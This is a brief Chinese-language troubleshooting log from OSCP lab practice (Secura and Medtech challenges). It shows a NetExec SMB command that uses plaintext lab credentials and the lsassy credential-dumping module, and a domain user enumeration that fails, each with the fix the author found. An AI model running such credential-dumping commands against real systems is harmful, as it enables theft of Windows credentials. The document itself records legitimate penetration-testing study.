## 遇到的问题
-------------------------------------------------------
### Challenge 0 - Secura
<details>
<summary>$ nxc smb 192.168.238.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy</summary>
  
```
┌──(syareya55㉿kali)-[~]
└─$ nxc smb 192.168.238.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy --no-smb
SMB         192.168.238.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:None)                                                                        
SMB         192.168.238.95  445    SECURE           [+] secura.yzx\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
[03:17:49] ERROR    Exception while calling proto_flow() on connection.py:187
                    target 192.168.238.95: [Errno 32]                        
                    Broken pipe
```

</details>

#### 解决的方式是：在OSCP官方的MyKali上运作
-------------------------------------------------------

### Challenge 1 - Medtech
<details>
<summary>C:\Users\Administrator\Desktop>net user /domain</summary>
  
```
C:\Users\Administrator\Desktop>net user /domain
net user /domain
The request will be processed at a domain controller for domain medtech.com.

System error 1355 has occurred.

The specified domain either does not exist or could not be contacted.
```

</details>

#### 解决的方式是：换个靶机打
-------------------------------------------------------
